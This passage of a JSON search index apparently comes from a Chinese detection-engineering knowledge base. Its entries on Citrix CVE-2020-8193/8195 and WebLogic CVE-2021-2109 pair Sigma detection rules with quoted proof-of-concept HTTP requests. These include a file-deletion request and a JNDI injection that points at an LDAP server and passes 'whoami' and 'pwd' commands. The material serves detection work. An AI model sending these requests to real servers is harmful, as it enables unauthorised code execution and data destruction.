WAN-OP\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u7ed5\u8fc7\u6743\u9650\u9650\u5236\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_2","text":"HTTP.log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_3","text":"\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u5efa\u8bae\u53c2\u8003\uff1a Citrix Systems\u4ea7\u54c1\u5b89\u5168\u6f0f\u6d1e CVE-2020-8193, CVE-2020-8195 and CVE-2020-8196 poc https://www.cnblogs.com/potatsoSec/p/13281577.html Citrix\u5b89\u5168\u7814\u7a76\u5386\u9669\u8bb0 https://blog.unauthorizedaccess.nl/2020/07/07/adventures-in-citrix-security-research.html","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_4","text":"\u6682\u65e0\u5b9e\u6d4b\uff0c\u622a\u53d6\u90e8\u5206\u516c\u5f00\u8d44\u6599\u5185\u5bb9\u4f5c\u4e3a\u7559\u75d5\u6570\u636e\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_5","text":"POST /rapi/filedownload?filter=remove:1,path:%2ftmp%2ftest HTTP/1.1 Host: citrix.local User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://citrix.local/menu/neo If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT rand_key: 2061490565.1580290269373855 DNT: 1 X-NITRO-USER: henk X-NITRO-PASS: henk Connection: close Cookie: startupapp=neo; is_cisco_platform=0; st_splitter=350px; rdx_pagination_size=25%20Per%20Page; SESSID=05afba59ef8e0e35933f3bc266941337 Content-Type: application/xml Content-Length: 31 <clipermission></clipermission> \u4ee5\u4e0a\u5185\u5bb9\u622a\u53d6\u81ea https://www.cnblogs.com/potatsoSec/p/13281577.html","title":"\u5220\u9664\u6587\u4ef6"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_6","text":"POST /pcidss/report?type=all_signatures&sid=254&username=nsroot&profile_name=default&set=0&sig_name=_default_signature_&sig_start_no=1 HTTP/1.1 Host: citrix.local User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://citrix.local/pcidss/launch_report?type=main Content-Type: application/xml Content-Length: 0 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 \u4ee5\u4e0a\u5185\u5bb9\u622a\u53d6\u81ea https://blog.unauthorizedaccess.nl/2020/07/07/adventures-in-citrix-security-research.html","title":"\u83b7\u53d6\u9ed8\u8ba4\u6240\u6709\u7b7e\u540d"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#sigma","text":"title: \u68c0\u6d4b\u53ef\u7591\u7684CVE-2020-8193/CVE-2020-8195 references: - https://www.cnblogs.com/potatsoSec/p/13281577.html - https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/ status: experimental date: 2020/07/10 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: c-uri|contains: - '/rapi/filedownload?filter=path:%2F' #\u5220\u9664\u6587\u4ef6\u65f6POST\u8bf7\u6c42\uff0cURL\u8def\u5f84\u5305\u542b\u7684\u5b57\u6bb5\u3002 selection2: c-uri|contains|all: - '/pcidss/report' #\u83b7\u53d6\u6240\u6709\u9ed8\u8ba4\u7b7e\u540d\u65f6POST\u8bf7\u6c42URL\u5185\u5305\u542b\u7684\u5b57\u6bb5 - 'type=all_signatures' - 'sig_name=_default_signature_' condition: 1 of them fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_8","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\uff0c\u7814\u5224\u653b\u51fb\u662f\u5426\u6210\u529f\u3002","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_9","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"T1190-CVE-2021-2109_Weblogic_LDAP_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b 2021\u5e741\u670820\u65e5\uff0c\u7eff\u76df\u79d1\u6280\u76d1\u6d4b\u53d1\u73b0Oracle\u5b98\u65b9\u53d1\u5e03\u4e862021\u5e741\u6708\u5173\u952e\u8865\u4e01\u66f4\u65b0\u516c\u544aCPU\uff08Critical Patch Update\uff09\uff0c\u5171\u4fee\u590d\u4e86329\u4e2a\u4e0d\u540c\u7a0b\u5ea6\u7684\u6f0f\u6d1e\uff0c\u5176\u4e2d\u5305\u62ec7\u4e2a\u5f71\u54cdWebLogic\u7684\u4e25\u91cd\u6f0f\u6d1e\uff08CVE-2021-1994\u3001CVE-2021-2047\u3001CVE-2021-2064\u3001CVE-2021-2108\u3001CVE-2021-2075\u3001CVE-2019-17195\u3001CVE-2020-14756\uff09\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6b21\u7684\u6f0f\u6d1e\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002CVSS\u8bc4\u5206\u5747\u4e3a9.8\uff0c\u5229\u7528\u590d\u6742\u5ea6\u4f4e\u3002\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\uff0c\u5bf9\u4e0a\u8ff0\u6f0f\u6d1e\u8fdb\u884c\u9632\u62a4\u3002 0x1 \u5f71\u54cd\u7248\u672c WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0 0x2 \u6f0f\u6d1e\u8be6\u60c5 \u53ef\u53c2\u8003\uff1a Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-210\uff1a https://blog.csdn.net/m0_46257936/article/details/112984836 \u3010\u6f0f\u6d1e\u590d\u73b0\u7cfb\u5217\u3011\u8d85\u8be6\u7ec6\u590d\u73b0\u8fc7\u7a0b_CVE-2021-2109_Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0_JDK\u7248\u672c\u5bf9\u6bd4\uff1a https://www.cnblogs.com/huaflwr/p/14317388.html \u68c0\u6d4b\u65e5\u5fd7 HTTP.log\uff0c\u4e3b\u8981\u662f\u57fa\u4e8ePOC\u62a5\u6587\u8fdb\u884c\u68c0\u6d4b\uff0cPOC\u5982\u4e0b\uff1a POST /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.122;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1 Host: 192.168.122.9:7001 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 cmd:whoami Cookie: ADMINCONSOLESESSION=8xUkHS93pNBdw9iRlb1XOoH5Iy5qm65NmKad54eCEtDI2PErEIXy!-181493417 Connection: close \u914d\u5408\u672a\u6388\u6743\u8bbf\u95ee\u540e\u53f0 POST /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.122;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1 Host: 192.168.122.9:7001 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 cmd:pwd Cookie: ADMINCONSOLESESSION=8xUkHS93pNBdw9iRlb1XOoH5Iy5qm65NmKad54eCEtDI2PErEIXy!-181493417 Connection: close \u6d4b\u8bd5\u590d\u73b0 \u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Oracle WebLogic CVE-2021-2109 HTTP\u534f\u8bae\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b status: \u6d4b\u8bd5\u72b6\u6001 description: \u57fa\u4e8eHTTP\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b references: - https://blog.csdn.net/m0_46257936/article/details/112984836 - https://www.cnblogs.com/Yang34/archive/2004/01/13/14327495.html logsource: category: webserver #\u65e5\u5fd7\u6e90\uff1awebserver detection: selection: cs-method: 'GET' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aGET c-uri|contains|all: #\u8bf7\u6c42url\u4e2d\u5305\u542b\u4ee5\u4e0b\u4efb\u610f\u5185\u5bb9 - 'com.bea.console.handles.JndiBindingHandle' - 'ldap://' - 'AdminServer' condition: selection fields: - c-ip - c-dns falsepositives: #\u8bef\u62a5\u60c5\u51b5 \u672a\u77e5 - Unknown level: critical tags: - attack.t1190 - attack.initial_access - cve.2021-2109 \u5efa\u8bae \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907(\u5929\u773c)\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-2109 https://blog.csdn.net/m0_46257936/article/details/112984836 \u3010\u6f0f\u6d1e\u590d\u73b0\u7cfb\u5217\u3011\u8d85\u8be6\u7ec6\u590d\u73b0\u8fc7\u7a0b_CVE-2021-2109_Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0_JDK\u7248\u672c\u5bf9\u6bd4 https://www.cnblogs.com/huaflwr/p/14317388.html CVE-2021-2109 Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c https://www.cnblogs.com/Yang34/archive/2004/01/13/14327495.html","title":"T1190-CVE-2021-2109_Weblogic_LDAP_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#t1190-cve-2021-2109_weblogic_ldap_","text":"","title":"T1190-CVE-2021-2109_Weblogic_LDAP_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"2021\u5e741\u670820\u65e5\uff0c\u7eff\u76df\u79d1\u6280\u76d1\u6d4b\u53d1\u73b0Oracle\u5b98\u65b9\u53d1\u5e03\u4e862021\u5e741\u6708\u5173\u952e\u8865\u4e01\u66f4\u65b0\u516c\u544aCPU\uff08Critical Patch Update\uff09\uff0c\u5171\u4fee\u590d\u4e86329\u4e2a\u4e0d\u540c\u7a0b\u5ea6\u7684\u6f0f\u6d1e\uff0c\u5176\u4e2d\u5305\u62ec7\u4e2a\u5f71\u54cdWebLogic\u7684\u4e25\u91cd\u6f0f\u6d1e\uff08CVE-2021-1994\u3001CVE-2021-2047\u3001CVE-2021-2064\u3001CVE-2021-2108\u3001CVE-2021-2075\u3001CVE-2019-17195\u3001CVE-2020-14756\uff09\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6b21\u7684\u6f0f\u6d1e\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002CVSS\u8bc4\u5206\u5747\u4e3a9.8\uff0c\u5229\u7528\u590d\u6742\u5ea6\u4f4e\u3002\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\uff0c\u5bf9\u4e0a\u8ff0\u6f0f\u6d1e\u8fdb\u884c\u9632\u62a4\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x1","text":"WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0","title":"0x1 \u5f71\u54cd\u7248\u672c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x2","text":"\u53ef\u53c2\u8003\uff1a Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-210\uff1a https://blog.csdn.net/m0_46257936/article/details/112984836 \u3010\u6f0f\u6d1e\u590d\u73b0\u7cfb\u5217\u3011\u8d85\u8be6\u7ec6\u590d\u73b0\u8fc7\u7a0b_CVE-2021-2109_Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0_JDK\u7248\u672c\u5bf9\u6bd4\uff1a https://www.cnblogs.com/huaflwr/p/14317388.html","title":"0x2 \u6f0f\u6d1e\u8be6\u60c5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"HTTP.log\uff0c\u4e3b\u8981\u662f\u57fa\u4e8ePOC\u62a5\u6587\u8fdb\u884c\u68c0\u6d4b\uff0cPOC\u5982\u4e0b\uff1a POST /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.122;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1 Host: 192.168.122.9:7001 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 cmd:whoami Cookie: ADMINCONSOLESESSION=8xUkHS93pNBdw9iRlb1XOoH5Iy5qm65NmKad54eCEtDI2PErEIXy!-181493417 Connection: close \u914d\u5408\u672a\u6388\u6743\u8bbf\u95ee\u540e\u53f0 POST /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.122;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1 Host: 192.168.122.9:7001 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 cmd:pwd Cookie: ADMINCONSOLESESSION=8xUkHS93pNBdw9iRlb1XOoH5Iy5qm65NmKad54eCEtDI2PErEIXy!-181493417 Connection: close","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#sigma","text":"title: Oracle WebLogic CVE-2021-2109 HTTP\u534f\u8bae\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b status: \u6d4b\u8bd5\u72b6\u6001 description: \u57fa\u4e8eHTTP\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b references: - https://blog.csdn.net/m0_46257936/article/details/112984836 - https://www.cnblogs.com/Yang34/archive/2004/01/13/14327495.html logsource: category: webserver #\u65e5\u5fd7\u6e90\uff1awebserver detection: selection: cs-method: 'GET' #\u8bf7\u6c42\u65b9\u6cd5\u4e3aGET c-uri|contains|all: #\u8bf7\u6c42url\u4e2d\u5305\u542b\u4ee5\u4e0b\u4efb\u610f\u5185\u5bb9 - 'com.bea.console.handles.JndiBindingHandle' - 'ldap://' - 'AdminServer' condition: selection fields: - c-ip - c-dns falsepositives: #\u8bef\u62a5\u60c5\u51b5 \u672a\u77e5 - Unknown level: critical tags: - attack.t1190 - attack.initial_access - cve.2021-2109","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907(\u5929\u773c)\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-2109_Weblogic_LDAP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Weblogic LDAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-2109 https://blog.csdn.net/m0_46257936/article/details/112984836 \u3010\u6f0f\u6d1e\u590d\u73b0\u7cfb\u5217\u3011\u8d85\u8be6\u7ec6\u590d\u73b0\u8fc7\u7a0b_CVE-2021-2109_Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0_JDK\u7248\u672c\u5bf9\u6bd4 https://www.cnblogs.com/huaflwr/p/14317388.html CVE-2021-2109 Weblogic Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c https://www.cnblogs.com/Yang34/archive/2004/01/13/14327495.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2021-21972%20Vmware%20vcenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%3ARCE%E6%BC%8F%E6%B4%9E/","text":"T1190-CVE-2021-21972 Vmware vcenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6/RCE\u6f0f\u6d1e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB 